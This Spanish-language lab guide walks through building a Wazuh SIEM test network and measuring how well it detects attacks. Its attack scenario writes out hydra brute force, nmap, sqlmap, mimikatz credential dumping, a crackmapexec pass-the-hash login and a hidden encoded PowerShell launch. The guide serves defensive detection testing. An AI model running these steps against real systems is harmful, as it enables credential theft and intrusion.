# Guía del Día de Laboratorio — Proyecto SIEM

Esta guía dice exactamente qué hacer, en qué máquina y en qué orden.
Tiempo estimado total: **3–4 horas**.

---

## ANTES DE EMPEZAR — Lista de chequeo

- [ ] Router encendido y con la configuración aplicada (R1-CORE)
- [ ] SW1 y SW2 encendidos con la configuración aplicada
- [ ] Cables físicos conectados según la tabla de cableado
- [ ] Los tres hosts físicos encendidos (servidores, clientes, gestión)

---

## PASO 1 — Levantar las VMs (hacer solo la primera vez del día)

En el **host de gestión** (tiene el SIEM y la Kali):
```
cd Desarrollo/Gestion
vagrant up
```

En el **host de servidores**:
```
cd Desarrollo/Servidores
vagrant up
```

En el **host de workstations**:
```
cd Desarrollo/Workstations
vagrant up
```

Esperar a que todas terminen de levantar antes de continuar.

---

## PASO 2 — Verificar conectividad básica entre VLANs

Entra al web-server y prueba que el routing entre VLANs funciona:

```
vagrant ssh web-server    # desde el host de servidores
```

Dentro de la VM:
```bash
ping -c 3 192.168.10.1    # gateway VLAN10 → debe responder
ping -c 3 192.168.30.10   # SIEM en VLAN30 → debe responder
ping -c 3 192.168.20.1    # gateway VLAN20 → debe responder
```

**Si no responde 192.168.30.10:** el router no está enrutando entre VLAN10 y VLAN30.
Verificar en el router: `show ip route` debe mostrar las 3 redes.

---

## PASO 3 — Registrar agentes en el SIEM (hacer solo una vez)

### 3a. En el SIEM (host de gestión)

```
vagrant ssh wazuh          # o el nombre de la VM del SIEM
sudo bash /vagrant/Lab/00_fix_agentes_wazuh.sh
```

Debe terminar sin errores y mostrar los puertos 1514 y 1515 escuchando.

### 3b. En CADA VM agente Linux

Repetir para: **web-server, dns1-server, dns2-server, dhcpv4-server,
dhcpv6-server, smtp-server, ntp-server, linux-01, linux-02**

```
vagrant ssh web-server     # ejemplo, repetir para cada una
sudo bash /vagrant/Lab/00_fix_agentes_en_VMs.sh
```

El script verifica conectividad, corrige ossec.conf y hace el enrollment.
Al final debe decir: `[OK] wazuh-agent activo`.

### 3c. Verificar en el dashboard

Abrir en el navegador: **https://192.168.30.10**
- Usuario: `admin`
- Contraseña: la que mostró el script de instalación de Wazuh
  (o buscarla con: `sudo cat /var/ossec/etc/authd.pass` en el SIEM)

Ir a **Agents** → deben aparecer todos los agentes en estado **Active**.

> **Si un agente aparece como Disconnected:** entrar a esa VM y correr
> `sudo /var/ossec/bin/agent-auth -m 192.168.30.10` y luego
> `sudo systemctl restart wazuh-agent`

---

## PASO 4 — Instalar reglas de correlación en el SIEM (hacer solo una vez)

Ya las instala `00_fix_agentes_wazuh.sh`, pero si quieres verificar:

```
vagrant ssh wazuh
ls /var/ossec/etc/rules/local_rules.xml   # debe existir
sudo /var/ossec/bin/wazuh-control restart
```

Las reglas cubren:
| ID     | Ataque              | MITRE      |
|--------|---------------------|------------|
| 100010 | Fuerza bruta SSH    | T1110.001  |
| 100020 | Escaneo de puertos  | T1046      |
| 100030 | Pass-the-Hash       | T1550.002  |
| 100040 | Inyección SQL       | T1190      |
| 100050 | Ejecución payload   | T1059.001  |

---

## PASO 5 — ESCENARIO 1: Línea base (tráfico normal)

**Objetivo:** medir cuántos falsos positivos genera el SIEM sin que haya ataques.

**Dónde:** en cualquier VM Linux de VLAN10 o VLAN20 (ej. web-server o linux-01)

```
vagrant ssh web-server
bash /vagrant/Lab/escenario1_linea_base.sh 30
```

Duración: 30 minutos. Deja correr y anota la hora de inicio y fin.

**Qué ver en el SIEM durante este tiempo:**
- Dashboard → Security Events
- Filtrar por: `rule.groups: attack`
- **No debería haber ninguna alerta de este grupo**
- Si aparecen, son falsos positivos — anotarlos

Al terminar, el script guarda la ventana en `/tmp/escenario1_ventana.txt`.

---

## PASO 6 — ESCENARIO 2: Ataques controlados

**Objetivo:** medir la tasa de detección de los 5 ataques.

**Dónde:** en la VM **Kali Linux** (192.168.30.20)

```
vagrant ssh kali           # desde el host de gestión
sudo bash /vagrant/Lab/escenario2_ataques.sh
```

El script corre automáticamente:
- **Ataque 1:** hydra → fuerza bruta SSH → web-server
- **Ataque 2:** nmap → escaneo de puertos → red 192.168.10.0/24
- **Ataque 3:** sqlmap → inyección SQL → web-server

Cada uno se repite **5 veces**. Deja correr (~45 minutos).

### Ataques 4 y 5 (manuales — hacer mientras corre el script anterior o después)

**Ataque 4 — Pass-the-Hash:**
1. Conectar por RDP al Windows DC: `192.168.10.20`
2. Abrir mimikatz como Administrador:
   ```
   mimikatz.exe
   privilege::debug
   sekurlsa::logonpasswords
   ```
3. Copiar el hash NT del usuario Administrator
4. Volver a Kali y ejecutar:
   ```bash
   INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
   crackmapexec smb 192.168.10.20 -u Administrator -H <HASH_NT>
   FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
   echo "pass_the_hash,T1550.002,192.168.10.20,$INICIO,$FIN,1" >> /tmp/log_ataques.csv
   ```
5. Repetir 5 veces (cambiar el número al final: 1,2,3,4,5)

**Ataque 5 — Payload PowerShell:**
1. Conectar por RDP a un Windows 10: `192.168.20.x`
2. Abrir PowerShell y ejecutar:
   ```powershell
   $INICIO = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
   powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA=
   $FIN = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
   ```
3. En Kali agregar al CSV:
   ```bash
   echo "payload_execution,T1059.001,192.168.20.30,$INICIO,$FIN,1" >> /tmp/log_ataques.csv
   ```
4. Repetir 5 veces

**Al terminar el escenario 2, anota las horas de inicio y fin del bloque completo.**

---

## PASO 7 — ESCENARIO 3: Tráfico mixto

**Objetivo:** probar detección con tráfico legítimo de fondo.

Necesitas **dos terminales simultáneas**:

**Terminal A** (en web-server o linux-01):
```
vagrant ssh web-server
bash /vagrant/Lab/escenario3_mixto.sh trafico
```

**Terminal B** (en Kali, al mismo tiempo):
```
vagrant ssh kali
sudo bash /vagrant/Lab/escenario3_mixto.sh ataques
```

Duración: 60 minutos. Ambos scripts terminan solos.

---

## PASO 8 — Calcular métricas

### 8a. Copiar el CSV de ataques al SIEM

Desde el host de gestión:
```bash
# Copiar desde Kali al SIEM
vagrant ssh wazuh
# O bien, si tienes acceso directo:
scp vagrant@192.168.30.20:/tmp/log_ataques.csv /tmp/
```

Si no puedes hacer SCP, copia el contenido manualmente:
```
# En Kali:
cat /tmp/log_ataques.csv

# En el SIEM, crear el archivo con ese contenido:
nano /tmp/log_ataques.csv
```

### 8b. Ejecutar el análisis (en el SIEM)

```
vagrant ssh wazuh
sudo bash /vagrant/Lab/calcular_metricas.sh \
    /tmp/log_ataques.csv \
    "2026-09-06T14:00:00Z" \
    "2026-09-06T18:00:00Z"
```

Reemplaza las horas con las reales del día de laboratorio.

Genera `/tmp/reporte_metricas.md` con:
- Tasa de detección global
- Tasa por tipo de ataque
- Falsos positivos
- Tabla de qué regla detectó qué ataque

### 8c. Ver el reporte

```
cat /tmp/reporte_metricas.md
```

O copiarlo a tu máquina:
```
scp vagrant@192.168.30.10:/tmp/reporte_metricas.md .
```

---

## Resumen: qué va en qué máquina

| Acción | Máquina | Comando |
|--------|---------|---------|
| Registrar agentes | SIEM | `sudo bash Lab/00_fix_agentes_wazuh.sh` |
| Conectar agente | Cada VM Linux | `sudo bash Lab/00_fix_agentes_en_VMs.sh` |
| Escenario 1 | web-server o linux-01 | `bash Lab/escenario1_linea_base.sh` |
| Escenario 2 (autos) | Kali | `sudo bash Lab/escenario2_ataques.sh` |
| Escenario 2 (PtH) | DC Windows + Kali | Manual (ver Paso 6) |
| Escenario 2 (Payload) | Windows 10 + Kali | Manual (ver Paso 6) |
| Escenario 3 tráfico | web-server o linux-01 | `bash Lab/escenario3_mixto.sh trafico` |
| Escenario 3 ataques | Kali | `sudo bash Lab/escenario3_mixto.sh ataques` |
| Calcular métricas | SIEM | `sudo bash Lab/calcular_metricas.sh ...` |
| Ver dashboard | Navegador | https://192.168.30.10 |

---

## Solución rápida de problemas comunes

**Agente no aparece en el SIEM:**
```bash
# En la VM agente:
sudo grep "address" /var/ossec/etc/ossec.conf   # debe decir 192.168.30.10
sudo systemctl status wazuh-agent
sudo tail -20 /var/ossec/logs/ossec.log
```

**hydra/nmap/sqlmap no están en Kali:**
```bash
sudo apt-get update && sudo apt-get install -y hydra nmap sqlmap
```

**No hay ping entre VLANs:**
```
# En el router:
show ip route
show ip interface brief   # todas las subinterfaces deben estar up/up
```

**El dashboard del SIEM no carga:**
```bash
# En el SIEM:
sudo systemctl status wazuh-dashboard
sudo systemctl restart wazuh-dashboard
```

**Wazuh manager caído:**
```bash
sudo systemctl restart wazuh-manager
sudo tail -50 /var/ossec/logs/ossec.log
```
